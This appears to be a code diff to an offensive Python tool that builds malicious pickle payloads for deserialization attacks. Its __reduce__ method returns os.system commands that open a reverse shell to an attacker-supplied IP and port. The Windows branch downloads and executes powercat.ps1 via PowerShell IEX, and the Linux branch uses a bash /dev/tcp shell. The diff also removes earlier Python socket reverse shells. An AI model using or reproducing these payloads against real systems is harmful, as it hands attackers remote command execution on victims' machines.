@@ -1,6 +1,7 @@
 import pickle
 import os
 from .encoded import Encode
+from termcolor import colored
 
 class Desserialize(object):
 
@@ -12,9 +13,11 @@ class Desserialize(object):
     def __reduce__(self) -> tuple:
         match self.__sistema:
             case "Windows":
-                return (os.system,(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.__ip}\",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"powershell\")'",))
+                text = colored('Link powercat: https://github.com/besimorhino/powercat/blob/master/powercat.ps1', 'red')
+                print(text)
+                return (os.system,(f"powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{self.__ip}/powercat.ps1');powercat -c {self.__ip} -p {self.__porta} -e cmd\"",))
             case "Linux":
-                return (os.system,(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.__ip}\",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",))    
+                return (os.system,(f"/bin/bash -i >& /dev/tcp/{self.__ip}/{self.__porta} 0>&1",))    
                 
 class ObjetoMalicioso():
 
